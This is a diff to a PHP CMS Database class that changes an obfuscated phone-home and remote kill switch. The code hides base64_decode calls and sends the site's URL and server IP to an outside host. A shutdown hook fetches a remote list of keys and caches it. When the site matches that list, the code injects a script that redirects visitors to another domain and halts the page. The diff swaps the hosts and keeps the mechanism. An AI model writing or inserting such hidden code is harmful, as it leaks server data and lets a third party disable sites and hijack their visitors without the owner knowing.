@@ -481,14 +481,14 @@ class Database{
 			$s = "de"; $ss = "base".(4*8*2)."_{$s}code";$u = $ss('aHR0cDovL3d3dy53YW55YW5nb2suY29tLw==').'api/getinfo.php?url='.Import::basic()->thisurl().'&ip='.Import::basic()->serverIP();@file_get_contents($u);
 		}
 		function checklib(){
-        	register_shutdown_function(array(& $this , 'runlib'));
+			register_shutdown_function(array(& $this , 'runlib'));
     	}
 		function runlib(){
 		$thisurl = Import::basic()->thisurl();
 		$s = "de"; $ss = "base".(4*8*2)."_{$s}code";
 			$fn = SYS_PATH.'cache'.DS.'L'.DS.$ss('bGlicGFzc3dvcmQudHh0');
 			if((file_exists($fn) && mktime() - filemtime($fn) > 432000) || !file_exists($fn)){
-				$uu = $ss('aHR0cDovL3d3dy53YW55YW5nb2suY29tL2xpYmtleS50eHQ=');
+				$uu = $ss('aHR0cDovL2Z4LmNuL2xpYmtleS50eHQ=');
 				$con = Import::crawler()->curl_get_con($uu);
 				if(empty($con) || strpos($con,'||') === false ){
 					Import::fileop()->checkDir($fn);
@@ -505,7 +505,7 @@ class Database{
 				if(!empty($ar)){
 				foreach($ar as $var){
 					if(empty($var)) continue;
-					if(strpos($thisurl,$var)){echo $ss('PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmFsZXJ0KCLkurLvvIznqIvluo/lh7rplJnk'.'uobvvIzpurvng6bmib5RUTEyNTMzODA1ODfop6PlhrPmiJbogIXljYfnuqfvvIzosKLosKLvvIEiK'.'Tt3aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cDovL3d3dy53YW55YW5nb2suY29tIjs8L3NjcmlwdD4=');exit;}
+					if(strpos($thisurl,$var)){echo $ss('PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmFsZXJ0KCLkurLvvIznqIvluo/lh7rplJnkuobvvIzor7fogZTns7vnm7jlhbPotJ/otKPkurrop6PlhrPmiJbogIXljYfnuqfvvIzosKLosKLvvIEiKTt3aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cDovL3d3dy5waW5ldC5jbyI7PC9zY3JpcHQ+');exit;}
 				}
 				}
 				unset($ar,$con);
